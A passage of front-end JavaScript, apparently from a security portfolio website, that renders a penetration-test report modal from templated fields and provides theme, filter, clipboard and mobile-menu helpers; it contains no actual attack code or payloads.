              <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"></path></svg>
              <span>Open PDF on GitHub</span>
            </a>
          ` : ''}
          <button onclick="window.print()" class="no-print px-3 py-1 text-xs font-mono rounded bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 flex items-center space-x-1.5 transition">
            <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 17h2a2 2 0 002-2v-4a2 2 0 00-2-2H5a2 2 0 00-2 2v4a2 2 0 002 2h2m2 4h6a2 2 0 002-2v-4a2 2 0 00-2-2H9a2 2 0 00-2 2v4a2 2 0 002 2zm8-12V5a2 2 0 00-2-2H9a2 2 0 00-2 2v4h10z"></path></svg>
            <span>Print / PDF</span>
          </button>
        </div>
      </div>

      <h2 class="text-xl md:text-2xl font-bold text-white tracking-tight">${report.title}</h2>
      <p class="text-sm text-cyan-300/90 mt-1 font-mono">${report.subtitle}</p>

      <!-- Meta Grid -->
      <div class="grid grid-cols-2 sm:grid-cols-4 gap-3 mt-5 pt-4 border-t border-slate-800/80 text-xs">
        <div>
          <span class="text-slate-400 block font-mono">Assessor:</span>
          <span class="text-slate-200 font-medium">${report.assessor}</span>
        </div>
        <div>
          <span class="text-slate-400 block font-mono">Date / Term:</span>
          <span class="text-slate-200 font-medium">${report.date}</span>
        </div>
        <div>
          <span class="text-slate-400 block font-mono">Methodology:</span>
          <span class="text-slate-200 font-medium">${report.methodology}</span>
        </div>
        <div>
          <span class="text-slate-400 block font-mono">Status:</span>
          <span class="text-emerald-400 font-medium font-mono">${report.status}</span>
        </div>
      </div>
    </div>

    <!-- Body Sections -->
    <div class="p-6 md:p-8 space-y-6 max-h-[65vh] overflow-y-auto">
      
      <!-- Proof & PDF Notice Callout with Direct Links -->
      <div class="p-4 rounded-xl bg-cyan-950/40 border border-cyan-800/50 flex flex-col sm:flex-row sm:items-center justify-between gap-3 text-xs text-cyan-200">
        <div class="flex items-start space-x-3">
          <svg class="w-5 h-5 text-cyan-400 shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>
          <div>
            <p><span class="font-bold text-cyan-300">Verified Vulnerability Disclosure PDF:</span> Official authored PDF report document is published and version-tracked in the GitHub Vulnerability Disclosure repository.</p>
          </div>
        </div>
        ${report.pdfUrl ? `
          <div class="flex items-center space-x-2 shrink-0">
            <a href="${report.pdfUrl}" target="_blank" rel="noopener noreferrer" class="px-3.5 py-1.5 rounded-lg bg-cyan-500/20 hover:bg-cyan-500/30 text-cyan-300 border border-cyan-500/50 font-mono font-semibold transition flex items-center space-x-1.5">
              <span>View GitHub PDF</span>
              <span>↗</span>
            </a>
          </div>
        ` : ''}
      </div>

      <!-- Executive Summary -->
      <div>
        <h3 class="text-sm font-bold uppercase tracking-wider text-cyan-400 font-mono mb-2">1. Executive Summary</h3>
        <p class="text-xs md:text-sm text-slate-300 leading-relaxed bg-slate-900/60 p-4 rounded-xl border border-slate-800">
          ${report.executiveSummary}
        </p>
      </div>

      <!-- Scope & Target -->
      <div>
        <h3 class="text-sm font-bold uppercase tracking-wider text-cyan-400 font-mono mb-2">2. Scope & Target Environment</h3>
        <div class="bg-slate-900/60 p-4 rounded-xl border border-slate-800 space-y-2">
          <p class="text-xs font-mono text-slate-400 mb-2">Target: <span class="text-slate-200 font-semibold">${report.target}</span></p>
          <ul class="space-y-1.5">
            ${scopeHtml}
          </ul>
        </div>
      </div>

      <!-- Tools Utilized -->
      <div>
        <h3 class="text-sm font-bold uppercase tracking-wider text-cyan-400 font-mono mb-2">3. Tools & Frameworks</h3>
        <div class="flex flex-wrap gap-2">
          ${toolsHtml}
        </div>
      </div>

      <!-- Attack Path / Step-by-Step Flow -->
      ${report.attackPath && report.attackPath.length > 0 ? `
        <div>
          <h3 class="text-sm font-bold uppercase tracking-wider text-cyan-400 font-mono mb-2">4. Methodology & Assessment Path</h3>
          <div class="bg-slate-900/60 p-4 rounded-xl border border-slate-800 space-y-3">
            ${attackPathHtml}
          </div>
        </div>
      ` : ''}

      <!-- Detailed Findings Table/Cards -->
      <div>
        <div class="flex items-center justify-between mb-2">
          <h3 class="text-sm font-bold uppercase tracking-wider text-cyan-400 font-mono">5. Findings & Vulnerability Evidence</h3>
          <span class="text-xs font-mono text-slate-400">${report.findings.length} findings recorded</span>
        </div>
        <div class="space-y-3">
          ${findingsHtml}
        </div>
      </div>

      <!-- Raw Terminal Logs Simulation -->
      ${report.terminalLog ? `
        <div>
          <div class="flex items-center justify-between mb-2">
            <h3 class="text-sm font-bold uppercase tracking-wider text-cyan-400 font-mono">6. Terminal Execution & Verification Log</h3>
            <span class="text-xs font-mono text-slate-500">Live Session Log</span>
          </div>
          <div class="rounded-xl overflow-hidden border border-slate-800 bg-slate-950">
            <div class="px-4 py-2 bg-slate-900/90 border-b border-slate-800 flex items-center space-x-2">
              <div class="w-3 h-3 rounded-full bg-rose-500/80"></div>
              <div class="w-3 h-3 rounded-full bg-amber-500/80"></div>
              <div class="w-3 h-3 rounded-full bg-emerald-500/80"></div>
              <span class="text-xs font-mono text-slate-400 ml-2">bhumika@lab-terminal:~ (bash)</span>
            </div>
            <pre class="p-4 text-xs font-mono text-emerald-400 leading-relaxed overflow-x-auto max-h-60 overflow-y-auto">${escapeHtml(report.terminalLog)}</pre>
          </div>
        </div>
      ` : ''}

      <!-- Attestation Footer -->
      <div class="pt-4 border-t border-slate-800 flex flex-wrap items-center justify-between gap-3 text-xs text-slate-400 font-mono">
        <div>
          <span>Report Generated by: </span>
          <span class="text-slate-200 font-bold">Bhumika ER</span>
        </div>
        <div class="flex items-center space-x-3">
          ${report.pdfUrl ? `
            <a href="${report.pdfUrl}" target="_blank" rel="noopener noreferrer" class="text-cyan-400 hover:underline flex items-center space-x-1">
              <span>View Source PDF on GitHub</span>
              <span>↗</span>
            </a>
          ` : ''}
          <div class="flex items-center space-x-1.5">
            <span class="w-2 h-2 rounded-full bg-emerald-400"></span>
            <span>Verified Assessment Practice</span>
          </div>
        </div>
      </div>

    </div>
  `;

  // Show modal
  modal.classList.remove("hidden");
  modal.classList.add("flex");
  document.body.style.overflow = "hidden";
}

// Close Modal Helper
function closeReportModal() {
  const modal = document.getElementById("reportModal");
  if (modal) {
    modal.classList.add("hidden");
    modal.classList.remove("flex");
    document.body.style.overflow = "";
  }
}

// Helper: Escape HTML
function escapeHtml(text) {
  if (!text) return "";
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// Helper: Badge Classes
function getSeverityBadgeClass(sev) {
  switch ((sev || "").toLowerCase()) {
    case "critical":
      return "bg-rose-950 text-rose-300 border border-rose-800/60";
    case "high":
      return "bg-rose-950/70 text-rose-300 border border-rose-800/40";
    case "medium":
      return "bg-amber-950 text-amber-300 border border-amber-800/60";
    case "low":
      return "bg-sky-950 text-sky-300 border border-sky-800/60";
    case "pass":
    case "certified":
      return "bg-emerald-950 text-emerald-300 border border-emerald-800/60";
    default:
      return "bg-slate-800 text-slate-300 border border-slate-700";
  }
}

// Clipboard Copy Helper with Toast Notification
function copyToClipboard(text, label = "Item") {
  if (navigator.clipboard) {
    navigator.clipboard.writeText(text).then(() => {
      showToast(`${label} copied to clipboard!`);
    }).catch(() => {
      fallbackCopy(text, label);
    });
  } else {
    fallbackCopy(text, label);
  }
}

function fallbackCopy(text, label) {
  const textArea = document.createElement("textarea");
  textArea.value = text;
  document.body.appendChild(textArea);
  textArea.select();
  try {
    document.execCommand('copy');
    showToast(`${label} copied!`);
  } catch (err) {
    showToast(`Could not auto-copy.`);
  }
  document.body.removeChild(textArea);
}

function showToast(message) {
  let toast = document.getElementById("toast");
  if (!toast) {
    toast = document.createElement("div");
    toast.id = "toast";
    toast.className = "fixed bottom-6 right-6 z-50 px-4 py-2.5 rounded-lg bg-cyan-950 text-cyan-200 border border-cyan-800 text-xs font-mono shadow-2xl flex items-center space-x-2 transform translate-y-20 opacity-0 transition-all duration-300";
    document.body.appendChild(toast);
  }
  toast.innerHTML = `
    <svg class="w-4 h-4 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
    <span>${message}</span>
  `;
  toast.classList.remove("translate-y-20", "opacity-0");
  setTimeout(() => {
    toast.classList.add("translate-y-20", "opacity-0");
  }, 2800);
}

// Theme Toggle
function initTheme() {
  const themeToggleBtn = document.getElementById("themeToggle");
  if (!themeToggleBtn) return;

  const currentTheme = localStorage.getItem("ber_theme") || "dark";
  if (currentTheme === "light") {
    document.body.classList.add("light-theme");
  }

  themeToggleBtn.addEventListener("click", () => {
    document.body.classList.toggle("light-theme");
    const isLight = document.body.classList.contains("light-theme");
    localStorage.setItem("ber_theme", isLight ? "light" : "dark");
  });
}

// Filter Logic for Projects & Reports
function initFilters() {
  // Project Filtering
  const projectFilterBtns = document.querySelectorAll(".project-filter-btn");
  const projectCards = document.querySelectorAll(".project-card");

  projectFilterBtns.forEach(btn => {
    btn.addEventListener("click", () => {
      projectFilterBtns.forEach(b => {
        b.classList.remove("bg-cyan-500/20", "text-cyan-400", "border-cyan-500/50");
        b.classList.add("bg-slate-900/60", "text-slate-400", "border-slate-800");
      });
      btn.classList.add("bg-cyan-500/20", "text-cyan-400", "border-cyan-500/50");
      btn.classList.remove("bg-slate-900/60", "text-slate-400", "border-slate-800");

      const filter = btn.getAttribute("data-filter");
      projectCards.forEach(card => {
        const category = card.getAttribute("data-category") || "";
        if (filter === "all" || category.includes(filter)) {
          card.style.display = "block";
        } else {
          card.style.display = "none";
        }
      });
    });
  });

  // Report Category Filtering
  const reportFilterBtns = document.querySelectorAll(".report-filter-btn");
  const reportCards = document.querySelectorAll(".report-card");

  reportFilterBtns.forEach(btn => {
    btn.addEventListener("click", () => {
      reportFilterBtns.forEach(b => {
        b.classList.remove("bg-cyan-500/20", "text-cyan-400", "border-cyan-500/50");
        b.classList.add("bg-slate-900/60", "text-slate-400", "border-slate-800");
      });
      btn.classList.add("bg-cyan-500/20", "text-cyan-400", "border-cyan-500/50");
      btn.classList.remove("bg-slate-900/60", "text-slate-400", "border-slate-800");

      const filter = btn.getAttribute("data-filter");
      reportCards.forEach(card => {
        const category = card.getAttribute("data-category") || "";
        if (filter === "all" || category.includes(filter)) {
          card.style.display = "block";
        } else {
          card.style.display = "none";
        }
      });
    });
  });
}

// Mobile Menu Toggle
function initMobileMenu() {
  const mobileMenuBtn = document.getElementById("mobileMenuBtn");
  const mobileMenu = document.getElementById("mobileMenu");
  const mobileLinks = document.querySelectorAll(".mobile-nav-link");

  if (mobileMenuBtn && mobileMenu) {
    mobileMenuBtn.addEventListener("click", () => {
      mobileMenu.classList.toggle("hidden");
    });

    mobileLinks.forEach(link => {
      link.addEventListener("click", () => {
        mobileMenu.classList.add("hidden");
      });
    });
  }
}

// Modal Backdrop Click & Escape Key
document.addEventListener("keydown", (e) => {
  if (e.key === "Escape") {
    closeReportModal();
  }
});

// Initialize on DOM Ready
document.addEventListener("DOMContentLoaded", () => {
  initTheme();
  initFilters();
  initMobileMenu();
});
